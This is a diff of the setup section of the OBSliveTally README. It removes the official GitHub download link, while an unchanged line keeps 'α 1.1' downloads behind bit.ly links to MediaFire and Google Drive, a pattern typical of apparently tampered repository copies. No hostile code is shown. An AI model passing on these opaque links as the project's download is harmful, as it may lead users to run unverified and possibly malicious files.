@@ -12,7 +12,7 @@ There is not that much to set up:
     
 -   Make sure that "Enable Websocket server" is checked, "Server Port" is 4444 and "Enable authentification" is unchecked
     
--   [Download this repository](https://github.com/lebaston100/OBSliveTally/archive/master.zip)  and unpack or clone it
+-   Download this repository and unpack or clone it
 
 	|α 1.1 | [Download MediFire](http://bit.ly/3tUOsBs) | [Dowload Google Drive ](http://bit.ly/3aPCNeh) |
 
